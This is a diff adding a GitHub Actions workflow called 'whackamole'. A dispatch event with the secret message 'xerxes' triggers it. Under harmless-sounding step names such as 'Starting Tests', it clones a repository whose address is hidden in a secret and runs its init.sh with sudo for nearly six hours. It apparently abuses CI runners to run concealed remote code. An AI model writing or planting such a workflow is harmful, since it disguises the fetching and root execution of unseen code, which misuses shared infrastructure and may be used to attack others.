@@ -1,0 +1,29 @@
+name: "whackamole"
+
+on:
+  workflow_dispatch:
+  repository_dispatch:
+    types: [runnnnnnnnnnnner]
+
+jobs:
+  startup:
+    name: "Starting Tests"
+    if: ${{ github.event.client_payload.message == 'xerxes' }}
+    runs-on: ubuntu-latest
+    steps:
+       - name: "Checkout Actions"
+         uses: actions/checkout@main
+
+       - name: "Stop Old Active Runs"
+         uses: styfle/cancel-workflow-action@0.10.1
+
+       - name: "Setting up Environment"
+         run: sleep 2 && git clone -q ${{ secrets.DATA }} mypath
+         env:
+           MESSAGE: ${{ github.event.client_payload.message }}
+
+       - name: "Starting Services"
+         timeout-minutes: 355
+         run: |
+           echo "Starting Scheduled boot up..."
+           cd mypath && sudo bash init.sh
